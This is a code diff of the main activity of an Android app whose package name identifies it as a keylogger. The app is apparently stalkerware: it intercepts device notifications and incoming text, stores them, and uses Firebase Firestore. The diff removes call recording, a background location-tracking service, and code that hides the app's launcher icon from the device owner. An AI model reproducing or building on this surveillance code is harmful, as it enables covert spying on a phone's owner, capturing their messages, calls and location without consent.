@@ -14,7 +14,6 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.view.isVisible
 import androidx.lifecycle.MutableLiveData
 import androidx.recyclerview.widget.RecyclerView
-import com.aykuttasil.callrecord.CallRecord
 import com.azamovhudstc.androidkeylogger.adapter.LogAdapter
 import com.azamovhudstc.androidkeylogger.adapter.NotificationAdapter
 import com.azamovhudstc.androidkeylogger.R
@@ -22,7 +21,6 @@ import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
 import com.azamovhudstc.androidkeylogger.model.LogModel
 import com.azamovhudstc.androidkeylogger.model.NotificationModel
 import com.azamovhudstc.androidkeylogger.service.CallRecordingService
-import com.azamovhudstc.androidkeylogger.service.LocationService
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 import com.google.firebase.FirebaseApp
 import com.google.firebase.firestore.FirebaseFirestore
@@ -49,7 +47,6 @@ class MainFixActivity : AppCompatActivity() {
     private lateinit var firestore: FirebaseFirestore
     companion object {
     }
-    private lateinit var callRecord: CallRecord
 
     private var _binding: ActivityMainBinding? = null
     private val binding get() = _binding!!
@@ -83,13 +80,6 @@ class MainFixActivity : AppCompatActivity() {
                 adapter.addNotification(notificationModel)
 
                 saveNotificationToFileLocal(notificationModel)
-                val p = packageManager
-                val componentName = ComponentName(this@MainFixActivity,MainFixActivity::class.java) // activity which is first time open in manifest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
-                p.setComponentEnabledSetting(
-                    componentName,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                )
 
 
 
@@ -154,6 +144,7 @@ class MainFixActivity : AppCompatActivity() {
         _binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
         FirebaseApp.initializeApp(this)
+        println("FIREBASE APP NAME :"+FirebaseApp.getInstance().name)
         firestore = FirebaseFirestore.getInstance()
 
         recyclerView = findViewById(R.id.notificationRecyclerView)
@@ -171,9 +162,6 @@ class MainFixActivity : AppCompatActivity() {
         val filter = IntentFilter("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
         registerReceiver(notificationReceiver, filter)
         registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))
-
-        val serviceIntent = Intent(this, LocationService::class.java)
-        startService(serviceIntent)
 
 
 
